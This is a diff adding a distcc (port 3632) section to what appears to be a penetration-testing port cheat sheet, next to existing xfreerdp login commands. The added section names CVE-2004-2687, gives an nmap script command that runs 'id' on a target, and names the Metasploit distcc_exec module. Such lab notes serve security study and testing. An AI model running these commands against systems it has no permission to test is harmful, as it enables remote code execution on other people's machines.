@@ -98,7 +98,20 @@ $ xfreerdp /u:<USER> /p:<PASSWORD> /cert:ignore /v:10.10.73.136 /workarea /tls-s
 ```bash
 $ xfreerdp /u:admin /p:password /cert:ignore /v:10.10.15.71  /tls-seclevel:0 /smart-sizing
 ```
-
+# Distcc (3632)
+Distcc is a distributed compiler tool that speeds up compilation by offloading tasks to other networked systems running the `distccd` daemon.
+## Exploitation
+**Vulnerability**: Distcc can be vulnerable to **CVE-2004-2687**, which allows remote code execution due to insufficient access control.
+### Test Exploit using Nmap
+Nmap can be used to test the vulnerability by executing a command on the remote system, such as retrieving the `id` of the current user:
+```bash
+nmap -p 3632 <ip> --script distcc-cve2004-2687 --script-args="distcc-exec.cmd='id'"
+```
+### Exploitation with Metasploit
+You can exploit this vulnerability using Metasploit:
+```bash
+use exploit/unix/misc/distcc_exec
+```
 
 
 # Mystery Port
